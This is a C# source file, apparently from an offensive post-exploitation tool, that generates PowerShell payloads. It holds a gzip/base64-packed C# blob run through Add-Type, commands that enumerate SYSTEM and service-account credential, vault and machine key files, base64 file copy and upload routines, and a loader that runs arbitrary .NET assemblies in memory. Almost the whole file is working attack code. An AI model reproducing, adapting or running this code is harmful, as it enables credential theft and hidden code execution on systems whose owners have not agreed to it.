OhNfus6yMoG+NFm8xqmYscV6AaXtRJFzDzq7ZX8euTNonzvZ+zZV5b7GcykeENxk6ae4dWs/TYaOExcIr1ZX0k/FvGHgOvveUj17p2KcJ+bkKlvKiJUX/NLpbp4A24T1gKK9InfmEO1Ui5W2jT/vtP70xx/HtkE9bOZOn5/H3MP+yUDJn1PR756ZD+fBw/npw/ntxR92dk0aiFL0WzVmnAS1sGn6ecETpqDXnzfpbKg0whzfdkn5imSJRyaTvXhhYFq+IuaqFoHyqOuxsqh/7ljVVVMYFnnJorebtleIWYVOCGnqpiMb3Dzcj4n4/CYJS/5QTHh6QluaOk+iWWWUG3It0FLcs3gqUja+eyL8rEkm7LEr8eAz/9Er3sD/id6b5lyTuKVPHtS1d6Gce8UakEqEYhECZ+hTZQOI44+pPUJsVyCp+d7Edjuu0kUEaUMjXBbOwrxQYzaFdwtsn3mo3pDK3Bgnp1f9N9rOUTe+8thzsRzJ9z55UhAFe0R4tJkxVTFf6tKYRJhzr7ogkX34GsfeRknujVuPa6VU0eIs6CKRRY/Q/tYzsV8NrEAWfgXfK0gcL4hbf94539k1/sRK7XTGk6Xpz37gkrvRgsPgZUt8ogBqajJEsLp/FcC0oUs9iuHfW/ZHe2oNHwajbmdg2NbkQ79rPRxb09PR5H3++2R42Ht+tvf8+4tvH3qnw+xr53h0/HE4OrGNwehodPyAW2Dhf8gAX2K+hAWeMoc3o86/2f1GJ3h2sw89kH7MfJBMLm2Z8DZzVfj78Car6YKj/JspVGUTqDH2+Kk8/p2U32/h+iWDaWPtNOvUV70dpoCQk0+zj+qhc6bR2sfNTfndGZmR/OaqX3uH4Mt07QvhB866joDy3cRsFuu1UurLzF/vwWW6eDPKrL7e87hbNM9wLcytwHty38oWj8ffqaEoO66boWrnVqfuOEl/3WWDoqcNeGwQ0qj5yd13lILQtvnuIX3R6tTxryWPpowdt7eUUnr1z+cJvj/mXIwqt+6rLawoElrIDzZKbeLiJEy4ZggEs6KK6Sg3BeSbN80oskkCXbbEnmtAWWhN7Ks6xXSeIGooGkXJo5Q6w/XsKgOlf036atXb+xbw9ZMRsf2n1mfE9h46iwxJs3NY9SE8E+am6kQLL9d4LoU49CLYUXGKABxNxt6upqE6zPeHC+OEd5qdhtTNXS2Ssee+4dxRJECisn3pKA6A2uAsbdaR4p6VWkNAhcxDP42XWnWjCtQAw1WymHKNClnMtao6ykGWiofIa779sTT9BLNUB5/PAz08t1Gh/KRrjZW6CUHNhrBK8Herzy4MJ7qK9bsvXF4QIns9Q3HVU6H6CpU6e35hDL2YJoQBwhTdPaWWMK7qYybli2cgeyTxbE8+F/l/87G1+XgC4/F5piO7TKhXAP4V/nz6byhxEsUVcgAA";
            string function = @"
$b64 = '{0}'
$output = New-Object System.IO.MemoryStream
$Stream = New-Object IO.Compression.GZipStream([IO.MemoryStream][Convert]::FromBase64String($b64),[IO.Compression.CompressionMode]::Decompress)
$Stream.CopyTo($output)
$data = [System.Text.Encoding]::utf8.GetString($output.ToArray())

$data = $data.Replace('REPLACEME', '{1}')
add-type -Language CSharp $data
[ConsoleApp1.Program]::DelegWalk()
";
            return String.Format(function, csFile, CompressData(command));
        }

        public static string FindSystemCred()
        {
            return @"
((@(""$env:SystemRoot\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials"",
""$env:SystemRoot\\System32\\config\\systemprofile\\AppData\\Roaming\\Microsoft\\Credentials"",
""$env:SystemRoot\\ServiceProfiles\\LocalService\\AppData\\Local\\Microsoft\\Credentials"",
""$env:SystemRoot\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Credentials"",
""$env:SystemRoot\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Credentials"",
""$env:SystemRoot\\ServiceProfiles\\NetworkService\\AppData\\Roaming\\Microsoft\\Credentials"") | where{test-path $_}) | get-Childitem -force).fullname | where{$_}
";
        }

        public static string FindSystemVault()
        {
            return @"
((@(""$env:SystemRoot\System32\config\systemprofile\AppData\Local\Microsoft\Vault"",
""$env:SystemRoot\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault"",
""$env:SystemRoot\ServiceProfiles\LocalService\AppData\Local\Microsoft\Vault"",
""$env:SystemRoot\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Vault"",
""$env:SystemRoot\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Vault"",
""$env:SystemRoot\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\Vault"") | where{test-path $_}) | get-Childitem -force).fullname | where{$_ -match ""[0-9A-Fa-f]{8}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{4}[-][0-9A-Fa-f]{12}""}
";
        }

        public static string FindSystemCert()
        {
            return @"
((@(""$env:SystemDrive\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys"",
""$env:SystemDrive\\Windows\\ServiceProfiles\\LocalService\\AppData\\Roaming\\Microsoft\\Crypto\\RSA"",
""$env:SystemDrive\\Users\\All Users\\Application Data\\Microsoft\\Crypto\\RSA\\MachineKeys"") | where{test-path $_}) | get-Childitem -force).fullname | where{$_}
";
        }

        public static string CopyFile(string path)
        {
            return String.Format(@"
$Path = Resolve-Path '{0}'
if (![IO.File]::Exists($Path)){{return $false}}
$FileBytes = [System.IO.File]::ReadAllBytes($Path)
$Length = $FileBytes.Length
$CompressedStream = New-Object IO.MemoryStream
$GZipStream = New-Object IO.Compression.GZipStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
$GZipStream.Write($FileBytes, 0, $FileBytes.Length)
$GZipStream.Dispose()
$CompressedFileBytes = $CompressedStream.ToArray()
$CompressedStream.Dispose()
[Convert]::ToBase64String($CompressedFileBytes)
", path);
        }

        public static string UploadFile(string data, string path)
        {
            return String.Format(@"
$b64 = '{0}'
$bytes = [Convert]::FromBase64String($b64)
$output = New-Object System.IO.MemoryStream
$Stream = New-Object IO.Compression.GZipStream([IO.MemoryStream]$bytes,[IO.Compression.CompressionMode]::Decompress)
$Stream.CopyTo($output)
[io.file]::WriteAllBytes('{1}', $output.ToArray())
", data, path);
        }

        public static string DecompressData(string data)
        {
            return String.Format(@"
$b64 = '{0}'
$output = New-Object System.IO.MemoryStream
$Stream = New-Object IO.Compression.GZipStream([IO.MemoryStream][Convert]::FromBase64String($b64),[IO.Compression.CompressionMode]::Decompress)
$Stream.CopyTo($output)
$data = [System.Text.Encoding]::ASCII.GetString($output.ToArray())
", data);
        }

        public static string ExecuteAssembly(string path, string arguments)
        {
            string file = Compress(File.ReadAllBytes(path));
            byte[] bytes = File.ReadAllBytes(path);
            string template;

            if (String.IsNullOrEmpty(arguments))
            {
                arguments = "";
            }

            template = string.Format(@"
$Code= @'
using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
namespace Loader
{{
    public static class Program
    {{

        public static byte[] Decompress(byte[] data)
        {{
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {{
                zipStream.CopyTo(resultStream);
                return resultStream.ToArray();
            }}
        }}

        public static string LoadAssembly(string[] args)
        {{
            
	        TextWriter realStdOut = Console.Out;
            TextWriter realStdErr = Console.Error;
            TextWriter stdOutWriter = new StringWriter();
            TextWriter stdErrWriter = new StringWriter();
            Console.SetOut(stdOutWriter);
            Console.SetError(stdErrWriter);
	        
			byte[] bin = Decompress(Convert.FromBase64String(""{0}""));
			Assembly a = Assembly.Load(bin);
			try
			{{
				a.EntryPoint.Invoke(null, new object[]
                {{
                    args.ToArray<string>()
                }});
			}}
			catch
			{{
				MethodInfo method = a.EntryPoint;
				if (method != null)
				{{
					object o = a.CreateInstance(method.Name);
					method.Invoke(o, null);
				}}
			}}
                
            Console.Out.Flush();
            Console.Error.Flush();
            Console.SetOut(realStdOut);
            Console.SetError(realStdErr);
    
            string output = """";
            output += stdOutWriter.ToString();
            output += stdErrWriter.ToString();
            return output;            

        }}
	}}
}}
'@
Add-Type -Language CSharp -TypeDefinition $code
[array]$arg = '{1}'.split()
", file, arguments);
            return String.Format(@"
{0}
iEx $data
$([Loader.Program]::LoadAssembly($arg) | out-string)
", DecompressData(CompressData(template)));
        }
    }
}